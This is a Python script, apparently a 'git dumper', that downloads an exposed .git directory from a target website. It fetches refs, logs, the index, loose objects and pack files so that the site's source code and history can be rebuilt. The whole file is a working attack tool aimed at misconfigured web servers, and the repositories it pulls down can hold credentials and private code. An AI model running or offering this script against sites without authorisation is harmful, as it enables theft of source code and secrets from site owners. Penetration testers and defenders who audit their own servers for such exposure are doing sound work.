import requests, os, sys, json, re
import gin
import os.path


if len(sys.argv) < 2:
	print("Please provide website URL e.g. example.com")
	exit()

website = sys.argv[1]


def has_hsts(site):
    """
    Connect to target site and check its headers."
    """
    try:
        req = requests.get('https://' + site)
    except requests.exceptions.SSLError as error:
        print("doesn't have SSL working properly" + error)
        return False
    if 'strict-transport-security' in req.headers:
        print("strict-transport-security YES")
        return True
    else:
        print("strict-transport-security NO")
        return False


if "http" not in website or "https" not in website:
	if has_hsts(website):
		website = "https://" + website
	else:
		website = "http://" + website
	
if not website.endswith("/"):
	website = website + "/.git/"
else:
	website = website + ".git/"

print("Final website URL: " + website)


if not os.path.exists(".git"):
	os.mkdir(".git")


fileNamesList = ["FETCH_HEAD", "HEAD", "ORIG_HEAD", "config", "description", "packed-refs", "info/exclude",
				"info/refs", "logs/HEAD", "logs/refs/heads/develop", "logs/refs/heads/master", "logs/refs/remotes/origin/develop"
				, "logs/refs/remotes/origin/step_develop", "logs/refs/remotes/origin/master", "logs/refs/remotes/github/master", 
				"refs/heads/develop", "refs/heads/master", "refs/remotes/origin/develop", "refs/remotes/origin/master",
				 "refs/remotes/origin/step_develop", "refs/remotes/github/master", "objects/info/packs", "refs/remotes/origin/HEAD"]

dirNamesList = ["info", "logs", "logs/refs", "logs/refs/heads", "logs/refs/remotes", "logs/refs/remotes/github",
				"logs/refs/remotes/origin", "refs", "refs/heads", "refs/remotes", "refs/remotes/origin", "refs/remotes/github", 
				"refs/tags","objects" , "objects/info", "objects/pack"]

for dirName in dirNamesList:
	if not os.path.exists(".git/" + dirName):
		os.mkdir(".git/" +  dirName)	

for fileName in fileNamesList:
	with open(".git/" + fileName, "wb+") as f:
		print("Fetching: " + fileName)
		try:
			downloaded = requests.get(website+fileName, allow_redirects=False).content
			if not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == ""):
				f.write(downloaded)
		except:
			pass

# .git/refs/tags/ missing  and .git/branches/ missing

for i in range(0,256):
	dirName = str( format(i, 'x') ).zfill(2)
	if not os.path.exists(".git/objects/" + dirName):
		os.mkdir(".git/objects/" + dirName)



print("Downloading Index File")
with open(".git/index", "wb+") as indexFile:
	downloaded = requests.get(website+"index", allow_redirects=False).content
	if not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == ""):
		indexFile.write(downloaded)

# open(".git/index", "wb+").write(requests.get(website + "index", allow_redirects=False).content)


# parse .git/index file
# .git/HEAD , .git/logs/HEAD , .git/logs/refs/heads/master , .git/logs/refs/remotes/github/master
# .git/packed-refs  ,  .git/ORIG_HEAD  , .git/info/refs
# .git/refs/heads/master , .git/refs/remotes/github/master , 
# .git/refs/remotes/origin/HEAD



print("Parsing Index File")
jsonList = gin.parse_file(".git/index", pretty=False)


sha1List = []
for element in jsonList:
	data = json.loads(element)
	try:
		sha1List.append(data['sha1'])
	except:
		pass

filesToParse = [".git/HEAD", ".git/logs/HEAD", ".git/logs/refs/heads/master",
		 ".git/logs/refs/remotes/github/master", ".git/packed-refs", ".git/ORIG_HEAD",
		 ".git/info/refs", ".git/refs/heads/master", ".git/refs/remotes/github/master",
		 ".git/refs/remotes/origin/HEAD"]

for fileToParse in filesToParse:
	if os.path.exists(fileToParse):
		with open(fileToParse , "r") as f:
			text = f.read()
			# extract sha1 (40 character words) from files 
			sha1List = sha1List + re.findall(r'\b\w{{{}}}\b'.format(40), text)

sha1List = list(set(sha1List))

for sha1 in sha1List:
	try:
		with open(".git/objects/" + sha1[:2] + "/" + sha1[-38:], "wb+") as f:
			print("Fetching: " + website+"objects/" + sha1[:2] + "/" + sha1[-38:])
			try:
				downloaded = requests.get(website+"objects/" + sha1[:2] + "/" + sha1[-38:], allow_redirects=False).content
				if not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == ""):
					print("done")
					f.write(downloaded)
				else:
					os.remove(".git/objects/" + sha1[:2] + "/" + sha1[-38:])
			except Exception as e:
				print(str(e))
				pass
	except:
		pass

	
		
if os.path.isfile(".git/objects/info/packs"):
	print("File exists .git/objects/info/packs -> try getting idx and pack files")
	
	with open(".git/objects/info/packs") as f:
		downloaded = f.readlines()
		if ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == ""):
			print("pack file not available -> exiting")
			exit()

	with open(".git/objects/info/packs") as f:
	    for line in f:
	    	if line.isspace():
	    		continue
	    	try:
	        	print("Fetching .git/objects/pack/" + line[-51:-1])
	        	with open(".git/objects/pack/" + line[-51:-1], "wb+") as packFile:
	        		downloaded = requests.get(website+"objects/pack/" + line[-51:-1], allow_redirects=False).content
	        		if not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == ""):
	        			packFile.write(downloaded)  # pack file
	        		else:
	        			os.remove(".git/objects/pack/" + line[-51:-1])
	    	except Exception as e:
	        		print(str(e))
	        		pass

	    	try:	
	        	print("Fetching .git/objects/pack/" + line[-51:-5] + "idx")
	        	with open(".git/objects/pack/" + line[-51:-5] + "idx", "wb+") as idxFile:
	        		downloaded = requests.get(website+"objects/pack/" + line[-51:-5] + "idx", allow_redirects=False).content
	        		if not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == ""):
	        			idxFile.write(downloaded) #idx file
	        		else:
	        			os.remove(".git/objects/pack/" + line[-51:-5] + "idx")
	    	except Exception as e:
	        	print(str(e))
	        	pass